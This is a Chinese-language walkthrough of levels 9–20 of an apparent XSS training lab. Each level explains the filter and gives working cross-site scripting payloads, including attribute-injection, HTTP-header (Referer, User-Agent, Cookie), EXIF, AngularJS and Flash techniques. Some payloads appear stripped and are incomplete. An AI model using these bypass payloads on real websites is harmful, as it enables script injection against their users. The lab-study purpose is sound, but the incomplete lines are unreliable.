审查元素
点击友情链接
## **level9**
url：
关键代码分析
通过审查源码发现"script"转换为"scr_ipt"，"on"转换为"o_n"，"src"转换为"sr_c"，"data"转换为"da_ta"，"href"转换为"hr_ef"，'"'转换为'&quot'，和上一关差不多，不同的是多了自动检测URL，如果发现没有带
构造payload：
    javascript:alert(1)//http://
    javascript:%0dhttp://%0dalert(/xss/)
审查元素
点击友情链接
## **level10**
url：
关键代码分析
通过审查源码发现需要两个参数，一个是keyword，一个是t_sort，尖括号<>都被转换成空，还有三个hidden的隐藏输入框，或许可以从隐藏的输入框下手，构造payload。
payload：
    keyword=test&t_sort="type="text" onclick="alert(/xss/)
审查元素
    keyword=test&t_sort=" type="text" onmouseover="alert(/xss/)
    keyword=test&t_sort=" type="text"onmouseover=alert`/xss/` "
    keyword=well done!&t_sort=" type="text" onclick="alert(/xss/)
## **level11**
url：
关键代码分析
通过审查源码发现和上一关相似，多了一个str11=$_SERVER['HTTP_REFERER'];验证的是http头部的xss注入，使用burp抓包，修改相应的字段，构造http头部referer的payload。
头部本身没有Referer，自行添加了，
    payload：Referer:" onmouseover=alert(/xss/) type="text"
    Referer:" onclick="alert(/xss/)" type="text
鼠标移动到搜索框触发弹窗
审查元素
## **level12**
url：
关键代码分析
通过审查源码发现，str11=_SERVER['HTTP_USER_AGENT'];应该是User-Agent的http头部注入，burp抓包，构造头部User-Agent的payload。
    User-Agent:" onmouseover=alert(/xss/) type="text"
    User-Agent:" onclick="alert(/xss/)" type="text
鼠标移动到搜索框触发弹窗
审查元素
## **level13**
url：
关键代码分析
通过审查源码发现，这次是cookie类型的xss注入，setcookie("user", "call me maybe?", time()+3600);
构造payload：
    Cookie: user=call+me+maybe%3F" type="text" onmouseover=alert(/xss/) type="text"
    Cookie: user=call+me+maybe%3F" type="text" onclick="alert(/xss/)
鼠标点击搜索框触发弹窗
审查元素
## **level14**
url：
查看源码发现exif，猜测应该是exif xss，但是这个链接由于网络的原因无法访问，exif
xss，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的exif元数据被修改为xss
payload，成功利用弹窗，具体实现使用kali下的exiftool工具，命令如下：
    exiftool -FIELD=XSS FILE
    exiftool -Artist=' ">' brute.jpeg
查看源码通过iframe标签引入了一个, 结合乌云爆出的
漏洞，上传一个含有xss代码的图片触发xss。
exif xss
## **level15**
这里用了angularjs的ng-include，直接在包含的页面里用触发不了，ng-include相当于php的include函数，然后src参数被转义了，最终我们
可以include leve1然后再用img标签传xss。
遵循SOP，只好调用第一关代码。
需要单引号包裹，否则变成注释。
paload：
    /level15.php?src='level1.php?name=test'
AngularJS ng-include 指令
ng-include 指令用于包含外部的 HTML 文件。
包含的内容将作为指定元素的子节点。
ng-include 属性的值可以是一个表达式，返回一个文件名。
默认情况下，包含的文件需要包含在同一个域名下。
    '">
## **level16**
url：
关键代码分析
通过审查源码发现大小写绕过失效，script、/、,等都被转换成&nbsp，这时，可以尝试使用%0a,%0d来进行绕过。
构造语句：
    keyword=
    keyword=
    keyword=
## **level17**
url：[http://47.94.9.224:84/level17.php?arg01=a&arg02=b](http://47.94.9.224:84/level17.php?arg01=a&arg02=b)
测试语句：
    arg01=a&arg02=%20onmouseover=alert`1`
审查元素
## **level18**
url：[http://47.94.9.224:84/level18.php?arg01=a&arg02=b](http://47.94.9.224:84/level18.php?arg01=a&arg02=b)
和上一关一样。
测试语句：
    arg01=a&arg02=%20onmouseover=alert`1`
## **level19**
url：
flash xss，需要对flash的反编译对源码进行分析，这里使用jpexs-decompiler来分析，首先定位getURL函数
然后追踪到sIFR的内容
得知version参数可以传入loc4变量中，即sIFR的内容中，但是getURL只在内容为link时打开，所以分析contentIsLink函数
所以我们可以构造` `标签来传值
构造payload：
    arg01=version&arg02=xss
点击xss即可触发弹窗
## **level20**
url：[http://47.94.9.224:84/level20.php?arg01=a&arg02=b](http://47.94.9.224:84/level20.php?arg01=a&arg02=b)
这题是zeroclipboard.swf的xss，构造payload
    arg01=id&arg02=\%22))}catch(e){}if(!self.a)self.a=!alert(1)//%26width%26height
文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。
免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。
转载声明：儒道易行
拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。